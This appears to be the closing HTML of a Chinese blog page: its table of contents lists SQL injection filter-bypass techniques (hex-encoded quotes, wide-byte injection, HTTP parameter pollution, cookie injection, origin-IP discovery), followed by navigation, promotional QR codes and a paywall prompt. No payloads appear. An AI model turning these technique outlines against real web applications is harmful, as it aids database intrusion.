class="toc-sidebar-link">逗号绕过（使用from或者offset）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#比较符号-绕过-过滤了-sqlmap盲注经常使用-使用between的脚本" class="toc-sidebar-link">比较符号（，使用between的脚本）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#or-and-xor-not绕过" class="toc-sidebar-link">or and xor not绕过</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#绕过注释符号-后面跟一个空格-过滤" class="toc-sidebar-link">绕过注释符号（#，--(后面跟一个空格））过滤</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#绕过" class="toc-sidebar-link">=绕过</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#绕过union-select-where等" class="toc-sidebar-link">绕过union，select，where等</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#通用绕过-编码" class="toc-sidebar-link">通用绕过（编码）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#等价函数绕过" class="toc-sidebar-link">等价函数绕过</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#宽字节注入" class="toc-sidebar-link">宽字节注入</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#多参数请求拆分" class="toc-sidebar-link">多参数请求拆分</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#http参数污染" class="toc-sidebar-link">HTTP参数污染</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#生僻函数" class="toc-sidebar-link">生僻函数</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#寻找网站源ip" class="toc-sidebar-link">寻找网站源IP</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#注入参数到cookie中" class="toc-sidebar-link">注入参数到cookie中</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box-toc-over"><img src="/images/system/toc.png" class="nozoom"> <span class="show-txt">目录</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="max-height:550px"><div style="font-weight:bold;text-align:center;">SQL注入绕过技术总结</div> <hr> <div class="toc-box"><ul class="toc-sidebar-links"><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#绕过空格-注释符-a0" class="toc-sidebar-link">绕过空格（注释符/ /，%a0）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#括号绕过空格" class="toc-sidebar-link">括号绕过空格</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#引号绕过-使用十六进制" class="toc-sidebar-link">引号绕过（使用十六进制）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#逗号绕过-使用from或者offset" class="toc-sidebar-link">逗号绕过（使用from或者offset）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#比较符号-绕过-过滤了-sqlmap盲注经常使用-使用between的脚本" class="toc-sidebar-link">比较符号（，使用between的脚本）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#or-and-xor-not绕过" class="toc-sidebar-link">or and xor not绕过</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#绕过注释符号-后面跟一个空格-过滤" class="toc-sidebar-link">绕过注释符号（#，--(后面跟一个空格））过滤</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#绕过" class="toc-sidebar-link">=绕过</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#绕过union-select-where等" class="toc-sidebar-link">绕过union，select，where等</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#通用绕过-编码" class="toc-sidebar-link">通用绕过（编码）</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#等价函数绕过" class="toc-sidebar-link">等价函数绕过</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#宽字节注入" class="toc-sidebar-link">宽字节注入</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#多参数请求拆分" class="toc-sidebar-link">多参数请求拆分</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#http参数污染" class="toc-sidebar-link">HTTP参数污染</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#生僻函数" class="toc-sidebar-link">生僻函数</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#寻找网站源ip" class="toc-sidebar-link">寻找网站源IP</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#注入参数到cookie中" class="toc-sidebar-link">注入参数到cookie中</a><ul class="toc-sidebar-sub-headers"></ul></li><li><a href="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html#写在最后" class="toc-sidebar-link">写在最后</a><ul class="toc-sidebar-sub-headers"></ul></li></ul></div></div></div></div></div> <div class="option-box"><img src="/images/system/wechat.png" class="nozoom"> <span class="show-txt">手机看</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.9rem">微信扫一扫</span> <img height="180px" src="https://api.qrserver.com/v1/create-qr-code/?data=https://binghe001.github.io/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html" style="margin:10px;">
+                可以<b>手机看</b>或分享至<b>朋友圈</b></div></div></div></div> <div class="option-box"><img src="/images/system/toggle.png" width="30px" class="nozoom"> <span class="show-txt">左栏</span></div> <div class="option-box"><img src="/images/system/xingqiu.png" width="25px" class="nozoom"> <span class="show-txt">星球</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">实战项目<span style="font-size:8px;color:red;">「SpringCloud Alibaba实战项目」</span>、专属电子书、问题解答、简历指导、技术分享、晋升指导、视频课程</span> <img height="180px" src="/images/personal/xingqiu.png" style="margin:10px;"> <b>知识星球</b>：冰河技术
+            </div></div></div></div> <div class="option-box"><img src="/images/system/wexin4.png" width="25px" class="nozoom"> <span class="show-txt">读者群</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">添加冰河微信<span style="color:red;">(hacker_binghe)</span>进冰河技术学习交流圈「无任何套路」</span> <img src="/images/personal/hacker_binghe.jpg" height="180px" style="margin:10px;">
+                PS：添加时请备注<b>读者加群</b>，谢谢！
+              </div></div></div></div> <div class="option-box"><img src="/images/system/download-2.png" width="25px" class="nozoom"> <span class="show-txt">下资料</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">扫描公众号，回复<span style="color:red;">“1024”</span>下载<span style="color:red;">100GB+</span>学习技术资料、PDF书籍、实战项目、简历模板等「无任何套路」</span> <img src="/images/personal/qrcode.png" height="180px" style="margin:10px;"> <b>公众号:</b> 冰河技术
+              </div></div></div></div> <div class="option-box"><img src="/images/system/heart-1.png" width="25px" class="nozoom"> <span class="show-txt">赞赏我</span> <div class="toc-container"><div class="pos-box"><div class="icon-arrow"></div> <div class="scroll-box" style="text-align:center"><span style="font-size:0.8rem;font-weight:bold;">鼓励/支持/赞赏我</span> <img height="180px" src="/images/personal/encourage-head.png" style="margin:5px;"> <br>1. 不靠它生存但仍希望得到你的鼓励；
+                <br>2. 时刻警醒自己保持技术人的初心；
+              </div></div></div></div> <div title="ASP连接MSSQL数据库语句" class="option-box" style="padding-left:2px;text-align:center;"><a href="/md/hack/sql/2022-05-02-004-ASP连接MSSQL数据库语句.html"><img src="/images/system/pre2.png" width="30px" class="nozoom"> <span class="show-txt">上一篇</span></a></div> <div title="SQL Server启动/关闭xp_cmdshell" class="option-box" style="padding-left:2px;text-align:center;"><a href="/md/hack/sql/2022-05-02-006-SQLServer启动-关闭xp_cmdshell.html"><img src="/images/system/next2.png" width="30px" class="nozoom"> <span class="show-txt">下一篇</span></a></div></div>  <!----> </aside></div><div class="global-ui"><div class="read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="read-more-btn" target="_self" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">阅读全文</a> <div id="btw-modal-wrap" style="display: none;"><div id="btw-mask" style="position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; opacity: 0.7; z-index: 999; background: rgb(0, 0, 0);"></div> <div id="btw-modal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; text-align: center; font-size: 13px; background: rgb(255, 255, 255); border-radius: 10px; z-index: 9999; font-family: PingFangSC-Regular, sans-serif;"><span id="btw-modal-close-btn" style="position: absolute; top: 5px; right: 15px; line-height: 34px; font-size: 34px; cursor: pointer; opacity: 0.2; z-index: 9999; color: rgb(0, 0, 0); background: none; border: none; outline: none;">×</span> <p id="btw-modal-header" style="margin-top: 40px; line-height: 1.8; font-size: 13px;">
+                扫码或搜索：<span style="color: #E9405A; font-weight: bold;">冰河技术</span> <br>发送：<span id="fustack-token" class="token" style="color: #e9415a; font-weight: bold; font-size: 17px; margin-bottom: 45px;">290992</span> <br>即可<span style="color: #e9415a; font-weight: bold;">立即永久</span>解锁本站全部文章</p> <img src="/images/personal/qrcode.png" style="width: 180px; margin-top: 10px; margin-bottom: 30px; border: 8px solid rgb(230, 230, 230);"></div></div></div><div class="pay-read-more-wrap" style="display:none;position:absolute;bottom:0px;z-index:9999;width:100%;margin-top:-100px;font-family:PingFangSC-Regular, sans-serif;"><div id="pay-read-more-mask" style="position: relative; height: 200px; background: -webkit-gradient(linear, 0 0%, 0 100%, from(rgba(255, 255, 255, 0)), to(rgb(255, 255, 255)));"></div> <a id="pay-read-more-btn" target="_blank" style="position: absolute; left: 50%; top: 70%; bottom: 30px; transform: translate(-50%, -50%); width: 160px; height: 36px; line-height: 36px; font-size: 15px; text-align: center; border: 1px solid rgb(222, 104, 109); color: rgb(222, 104, 109); background: rgb(255, 255, 255); cursor: pointer; border-radius: 6px;">付费阅读</a></div></div></div>
+    <script src="/assets/js/cg-styles.js?v=1651498924626" defer></script><script src="/assets/js/cg-4.js?v=1651498924626" defer></script><script src="/assets/js/cg-3.js?v=1651498924626" defer></script><script src="/assets/js/cg-156.js?v=1651498924626" defer></script><script src="/assets/js/cg-5.js?v=1651498924626" defer></script><script src="/assets/js/cg-6.js?v=1651498924626" defer></script><script src="/assets/js/cg-app.js?v=1651498924626" defer></script>
+  </body>
+</html>
